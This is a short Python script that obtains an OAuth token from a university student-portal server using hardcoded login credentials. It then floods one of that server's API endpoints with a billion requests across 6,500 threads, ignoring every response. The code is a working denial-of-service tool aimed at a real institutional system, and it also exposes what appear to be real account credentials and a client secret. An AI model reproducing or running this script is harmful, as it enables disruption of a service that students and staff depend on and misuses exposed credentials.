import requests
from concurrent.futures import ThreadPoolExecutor

def login():
    url_login = "https://sinhvien1.tlu.edu.vn:8098/education/oauth/token"

    data_request_login = {
        "client_id": "education_client",
        "grant_type": "password",
        "username": "2151183845",
        "password": "001303037558",
        "client_secret": "password"
    }

    try:
        response = requests.post(url_login, data=data_request_login, timeout=15)  # Set a timeout if needed
        response.raise_for_status()

        access_token = response.json().get("access_token")
        print(f"Access Token: {access_token}")

        return access_token
    except requests.exceptions.RequestException as e:
        print(f"Error during login")
        return None

def make_request(access_token, _):
    url = "https://sinhvien1.tlu.edu.vn:8098/education/api/studentsubjectmark/checkFinishedEducationProgramOfStudent/tree/studentId/127"
    headers = {
        "Authorization": "Bearer " + access_token
    }

    print("aaa")
    try:
        requests.get(url, headers=headers, timeout=2)
    except requests.exceptions.RequestException as e:
        # Log the exception or do nothing to ignore the error
        pass

def main():
    access_token = login()
    if access_token is None:
        print("Login failed. Exiting.")
        return
    
    # Number of parallel requests
    num_requests = 1000000000

    # Set max_workers to a higher value
    max_workers = 6500

    # Use ThreadPoolExecutor to make asynchronous requests
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Use submit instead of map to fire off asynchronous requests
        futures = [executor.submit(make_request, access_token, _) for _ in range(num_requests)]

    print("All requests submitted")

if __name__ == "__main__":
    main()